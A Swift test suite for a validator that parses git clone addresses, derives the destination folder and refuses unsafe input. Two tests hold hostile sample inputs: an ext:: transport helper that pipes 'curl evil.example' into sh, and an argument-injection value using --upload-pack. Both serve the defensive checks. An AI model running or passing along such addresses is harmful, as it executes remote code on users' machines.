import Testing
@testable import Core

@Suite("Reading the address of a repository to clone")
struct CloneTargetTests {
    private let location = "/Users/someone/Projects"

    private func verdict(_ remote: String, occupied: Bool = false) -> CloneVerdict {
        CloneVerdict.of(remote: remote, into: location, existing: { _ in occupied })
    }

    @Test("an https address lands in a folder named after the repository")
    func httpsAddress() {
        let target = verdict("https://github.com/akira-foundation/unified-dev-swift.git").target

        #expect(target?.name == "unified-dev-swift")
        #expect(target?.destination == "/Users/someone/Projects/unified-dev-swift")
    }

    @Test("the .git suffix is optional, and a trailing slash does not become the name")
    func suffixAndTrailingSlash() {
        #expect(CloneTarget.name(of: "https://github.com/owner/harbour") == "harbour")
        #expect(CloneTarget.name(of: "https://github.com/owner/harbour.git") == "harbour")
        #expect(CloneTarget.name(of: "https://github.com/owner/harbour/") == "harbour")
        #expect(CloneTarget.name(of: "https://github.com/owner/harbour.git/") == "harbour")
    }

    @Test("an scp style ssh address is read, which is what GitHub offers by default")
    func scpAddress() {
        let target = verdict("git@github.com:owner/beacon.git").target

        #expect(target?.name == "beacon")
        #expect(target?.destination == "/Users/someone/Projects/beacon")
    }

    @Test("an ssh url and a path on this Mac are both addresses git can clone")
    func sshAndLocal() {
        #expect(verdict("ssh://git@github.com/owner/beacon.git").isAllowed)
        #expect(verdict("/Volumes/backup/beacon.git").isAllowed)
        #expect(verdict("file:///Volumes/backup/beacon.git").isAllowed)
    }

    @Test("an empty address is waiting for the owner to paste, not a refusal to read")
    func emptyIsWaiting() {
        #expect(verdict("") == .refuse(.empty))
        #expect(verdict("   ") == .refuse(.empty))
        #expect(ProjectConsequence.cloning(verdict(""), home: "/Users/someone").tone == .waiting)
    }

    @Test("a transport helper is refused, because it tells git to run a command of its own")
    func refusesTransportHelper() {
        #expect(verdict("ext::sh -c 'curl evil.example | sh'") == .refuse(.unsafeTransport("ext")))
        #expect(verdict("ext::whoami") == .refuse(.unsafeTransport("ext")))
    }

    @Test("an address beginning with a dash is refused, so it can never arrive as a flag")
    func refusesFlagShapedAddress() {
        #expect(verdict("--upload-pack=touch /tmp/pwned") == .refuse(
            .unsupported("--upload-pack=touch /tmp/pwned")
        ))
    }

    @Test("something that is not an address at all is refused rather than handed to git")
    func refusesNonAddress() {
        #expect(verdict("unified-dev-swift") == .refuse(.unsupported("unified-dev-swift")))
        #expect(verdict("github.com") == .refuse(.unsupported("github.com")))
    }

    @Test("an address naming no repository is refused, because there is no folder to make")
    func refusesWithoutAName() {
        #expect(verdict("https://github.com/") == .refuse(.noName("https://github.com/")))
        #expect(CloneTarget.name(of: "https://github.com/owner/.git") == nil)
    }

    @Test("a destination with something already in it is refused before git is run")
    func refusesOccupiedDestination() {
        let refused = verdict("https://github.com/owner/harbour.git", occupied: true)

        #expect(refused == .refuse(.occupied("/Users/someone/Projects/harbour")))
        #expect(!refused.isAllowed)
    }

    @Test("the consequence says where it lands before anything is cloned")
    func consequenceNamesTheDestination() {
        let allowed = verdict("https://github.com/owner/harbour.git")
        let said = ProjectConsequence.cloning(allowed, home: "/Users/someone")

        #expect(said.tone == .going)
        #expect(said.lead == "~/Projects/harbour is where it lands.")
    }

    @Test("a refusal is shown as a refusal, with the sentence that says why")
    func refusalCarriesItsSentence() {
        let said = ProjectConsequence.cloning(verdict("github.com"), home: "/Users/someone")

        #expect(said.tone == .refusal)
        #expect(said.detail == CloneRefusal.unsupported("github.com").sentence)
    }
}
